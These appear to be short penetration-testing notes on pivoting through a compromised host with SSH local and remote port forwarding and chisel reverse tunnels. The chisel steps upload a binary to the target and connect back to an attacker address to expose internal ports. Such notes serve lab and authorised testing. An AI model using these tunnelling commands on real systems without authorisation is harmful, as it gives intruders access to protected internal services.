Using SSH Tunnels (You must have ssh access to the victim)
	
	1. Local: Forwards a connection from the client host to the SSH server host and then	to the destination host port.

		>ssh -L <local_ip>:<local_port>:<dest_service>:<dest_port> username@<ip>
		
		-> If local_ip is omitted, the ssh client binds on the localhost.
		-> When the destination host is the same as the SSH server, instead of specifying the destination host IP or hostname, you can use localhost.


		For example, You want to access a webserver running on the victim's port 10000 and you cant access from outside, then you can set up a local port forward like this:
			>ssh -L 8080:localhost:10000 -N -f username@SSH_server_IP
				-N: dont execute the command
				-f: to run in the background.

	2. Remote: Forwards a port from the server host to the client host and then to the destination host port.
		>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER


Chisel Reverse Port Forwarding
	1. Upload chisel windows binary to the target.
	2. Run chisel server locally:
		./chisel_1.7.3_linux_amd64 server -p 5678 -reverse
		-> This means we have opened up a port 5678 to which chisel client will connect to
	3. Run chisel client on the target:
		chisel.exe client 10.10.16.20:5678 R:8888:127.0.0.1:8888
		-> This means we are connecting to the chisel server running on the attacker machine, and forwarding port 8888 locally so that we can access port 8888 on the attacking machine.
		

